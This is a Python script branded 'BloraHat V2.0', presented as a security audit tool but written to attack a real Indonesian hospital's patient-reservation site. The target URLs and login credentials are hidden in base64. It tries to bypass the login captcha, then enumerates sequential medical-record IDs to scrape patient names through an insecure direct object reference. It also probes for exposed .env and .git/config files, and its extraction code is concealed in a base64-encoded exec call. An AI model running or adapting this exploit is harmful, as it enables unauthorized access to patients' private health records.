import requests
from bs4 import BeautifulSoup
import base64
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
import re

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE=") 
TGL_LAHIR = _decode("MTUwMTE5OTA=") 
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
lock = threading.Lock()
hasil_data = []
total_checked = 0

def login():
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[93m!\033[0m] Bypass Failed: Captcha required by server.")
            print(f"[*] Manual Step: Silakan buka {URL_HAL_LOGIN} di browser.")
            captcha = input("[?] Masukkan Captcha yang terlihat: ")
            
            if not captcha: return False
            
            payload['c'] = captcha
            res = session.post(URL_ACTION_LOGIN, data=payload)
            
            if "login" in res.url:
                print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                return False

        # Mendapatkan Session ID secara dinamis dari cookie jar
        cookies = session.cookies.get_dict()
        session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or (list(cookies.values())[0] if cookies else 'Not Found')
        print(f"[\033[92m+\033[0m] Authentication Success.")
        print(f"[*] Captured Token : {token_t}")
        print(f"[*] Session ID     : {session_id}")
        return True
    except:
        return False

def fetch_data(id_num):
    global total_checked
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        res = session.get(url, timeout=10)
        time.sleep(0.3) # Jeda singkat untuk menghindari blokir IP
        
        with lock:
            total_checked += 1
            # Menampilkan heartbeat setiap 50 ID agar user tahu script tidak hang
            if total_checked % 50 == 0:
                print(f"[*] Scanning... Checked {total_checked} IDs", end='\r')

        if res.status_code != 200: return

        # Protected extraction and masking logic
        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 'Data ditemukan'.
        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOntmb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHttYXNrfScp"))

    except Exception as e:
        pass # Diamkan error koneksi kecil agar terminal tetap bersih

def audit_security_config():
    print("[*] Starting Security Configuration Audit...")
    base_url = "https://dolan.rsudsoetijonoblora.com/" 
    
    # 1. Security Headers Check
    print("\n[+] Audit: Security Headers Analysis")
    try:
        res = session.get(base_url, timeout=10)
        sec_headers = ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
        for h in sec_headers:
            status = "\033[92mFound\033[0m" if h in res.headers else "\033[91mMissing\033[0m"
            print(f" [!] {h.ljust(25)}: {status}")
    except: print("[!] Error: Host unreachable.")

    # 2. Information Disclosure Check (Sensitive Paths)
    print("\n[+] Audit: Sensitive Path Discovery")
    paths = [".env", ".git/config", "robots.txt", "phpinfo.php", ".htaccess"]
    for p in paths:
        target = base_url + p
        try:
            r = session.get(target, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(f" [\033[91m!\033[0m] Potential Leakage : {target} (\033[91m200 OK\033[0m)")
            else:
                print(f" [\033[92m✓\033[0m] Path {p.ljust(12)} : Secure ({r.status_code})")
        except: pass

def parameter_discovery_audit():
    print("[*] Starting Parameter Discovery Audit (Authenticated)...")
    target_home = "https://dolan.rsudsoetijonoblora.com/index.php/home"
    
    try:
        res = session.get(target_home, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        links = soup.find_all('a', href=True)
        
        # Mencari tautan yang mengandung pola angka (ID Rekam Medis)
        potential_targets = []
        for link in links:
            href = link['href']
            match = re.search(r'/(\d{6,12})', href)
            if match and "logout" not in href.lower():
                potential_targets.append((href, match.group(1)))
        
        if potential_targets:
            print(f"\n[+] Detected {len(potential_targets)} potential Path Variable targets.")
            
            # 1. Randomization: Memilih satu target secara acak untuk diuji
            base_url, original_id = random.choice(potential_targets)
            masked_original = "*" * (len(original_id) - 1) + original_id[-1]
            print(f"[*] Random Target Selected: {base_url.replace(original_id, masked_original)}")
            
            # 2. Automated Manipulation Test
            print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
            
            # Generate ID baru dengan offset acak
            offset = random.choice([x for x in range(-100, 101) if x != 0])
            test_id = str(int(original_id) + offset).zfill(len(original_id))
            test_url = base_url.replace(original_id, test_id)
            
            test_res = session.get(test_url, timeout=10)
            test_soup = BeautifulSoup(test_res.text, 'html.parser')
            
            # Mendeteksi apakah manipulasi berhasil (mencari tag nama pasien)
            name_tag = test_soup.find('p', class_='sale-price text-success')
            masked_test_id = "*" * (len(test_id) - 1) + test_id[-1]
            
            if name_tag:
                name = name_tag.get_text(strip=True)
                masked_name = f"{name[:2].upper()}..{name[-2:].upper()}"
                print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                print(f" [!] Manipulated ID : {masked_test_id}")
                print(f" [!] Discovered Data: {masked_name}")
                print(f" [!] Vulnerability  : \033[91mIDOR Confirmed\033[0m\n")
            else:
                print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {masked_test_id}.")
                print(f" [!] Result         : No data extracted (Status: {test_res.status_code})\n")
        else:
            print("[!] No obvious tamperable parameters found on the dashboard.")
    except Exception as e:
        print(f"[!] Discovery Error: {str(e)}")

def start_process(start_range, end_range):
    if login():
        print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
        with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
            executor.map(fetch_data, range(start_range, end_range + 1))
        print("\n[*] IDOR Audit Completed. Data displayed in terminal.")

def main_menu():
    while True:
        clear()
        show_banner()
        print(" [1] Auth Test (Captcha Bypass Testing)")
        print(" [2] IDOR Scan (Input Jumlah Data)")
        print(" [3] Security Config Audit (Headers & Files)")
        print(" [4] Parameter Discovery (URL Tampering Scan)")
        print(" [0] Exit")
        print("\n")
        
        choice = input(" BloraHat > ")

        if choice == '1':
            login()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '2':
            try:
                count = int(input("[?] Jumlah data yang ingin di scan: "))
                BASE_ID = int(_decode("NTAyMDEz")) 
                # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
                start_process(BASE_ID, BASE_ID + count)
            except ValueError:
                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '3':
            if login():
                audit_security_config()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '4':
            if login():
                parameter_discovery_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '0':
            print("Happy Auditing!")
            sys.exit()
        else:
            print("Pilihan tidak valid.")
            input("Tekan Enter untuk mencoba lagi...")

if __name__ == "__main__":
    main_menu()
